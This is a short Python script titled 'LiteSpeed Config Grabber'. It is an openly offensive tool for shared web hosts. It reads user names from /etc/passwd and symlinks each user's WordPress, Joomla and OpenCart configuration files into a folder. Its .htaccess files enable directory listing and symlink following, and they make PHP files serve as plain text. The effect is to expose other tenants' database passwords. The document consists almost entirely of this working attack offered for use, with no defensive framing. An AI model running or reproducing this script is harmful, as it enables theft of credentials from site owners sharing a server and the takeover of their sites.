#!
#/ LiteSpeed Config Grabber
#/ Coded by NinjaCR3
#/ www.github.com/NinjaCR3
#!

import os

htaccess_content = """Options all
Options +Indexes
Options +FollowSymLinks
DirectoryIndex Sux.html
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html
AddHandler txt .html"""

def htwrite():
    htaccess = open(".htaccess","w+")
    htaccess.write(htaccess_content)
    htaccess.close()

os.mkdir("LiteConfigs")
os.chdir("LiteConfigs")
htwrite()

os.mkdir("WordPress")
os.chdir("WordPress")
htwrite()
os.chdir("..")

os.mkdir("Joomla")
os.chdir("Joomla")
htwrite()
os.chdir("..")

os.mkdir("OpenCart")
os.chdir("OpenCart")
htwrite()
os.chdir("..")

os.system('cat /etc/passwd | cut -d ":" -f1 > passwd.txt')

passwd = open("passwd.txt","r").read().splitlines()

for pwd in passwd:
    # 1) WordPress
    os.chdir("WordPress")
    os.mkdir(pwd)
    os.chdir(pwd)
    os.system("ln -s /home/" + pwd + "/public_html/wp-config.php HEADER")
    os.chdir("../..")
    # 2) Joomla
    os.chdir("Joomla")
    os.mkdir(pwd)
    os.chdir(pwd)
    os.system("ln -s /home/" + pwd + "/public_html/configuration.php HEADER")
    os.chdir("../..")
    # 3) OpenCart
    os.chdir("OpenCart")
    os.mkdir(pwd)
    os.chdir(pwd)
    os.system("ln -s /home/" + pwd + "/public_html/config.php HEADER")
    os.chdir("../..")
    
os.system("rm -rf passwd.txt")

print("""
[!] LiteSpeed Config Grabber
[!] Coded by NinjaCR3
[!] www.github.com/NinjaCR3

[+] Configs Grabbed Successfully!
    Check 'LiteConfigs' folder!
""")